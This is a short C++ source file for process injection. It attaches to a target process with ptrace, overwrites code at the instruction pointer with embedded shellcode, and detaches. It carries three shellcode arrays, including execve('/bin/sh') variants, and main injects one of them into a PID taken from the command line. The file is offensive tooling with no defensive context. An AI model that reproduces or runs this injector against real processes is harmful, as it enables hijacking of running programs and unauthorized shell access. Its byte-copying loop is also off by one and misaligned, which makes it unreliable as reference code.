#include <iostream>

#include <cstring>

#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <wait.h>

#include <stdlib.h>
#include <stdio.h>

#include "../lib/include/done.h"
#include "../lib/include/fatal.h"


// Global
char code1[]="\x48\x31\xc0\xb0\x3c\x0f\x05"; // exit(0) shellcode for x86 and x64
char code2[]="\xb0\x0b\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x5b\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x0f\x05"; // execve("/bin/sh", NULL, NULL) shellcode for x86_64
char code3[]="\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05";

struct user_regs_struct regs;

// prototypes
int InjectProcess(pid_t pid,const char *sc, int size);

//

int main(int argc, char **argv){
    InjectProcess(atoi(argv[1]), code3,29);
}


int InjectProcess(pid_t pid,const char *sc, int size){
    int status;
    if (ptrace(PTRACE_ATTACH , pid,NULL,NULL)==-1){fatal("Error Attaching to process, returning -1 from InjectProcess function..!"); return -1;}
    waitpid(pid, &status, 0);
    if (ptrace(PTRACE_GETREGS, pid,NULL,&regs)==-1){fatal("Error Dumping Registers Data, Returning False");return -1;}
    for (int tmp=0; tmp<=size; tmp++)
        if(ptrace(PTRACE_POKETEXT, pid, regs.rip+tmp, (int*)(sc+tmp))==-1){fatal ("An Error Ocured While injecting byte number");}
    ptrace(PTRACE_DETACH, pid, 0, 0);
    return 0;
}
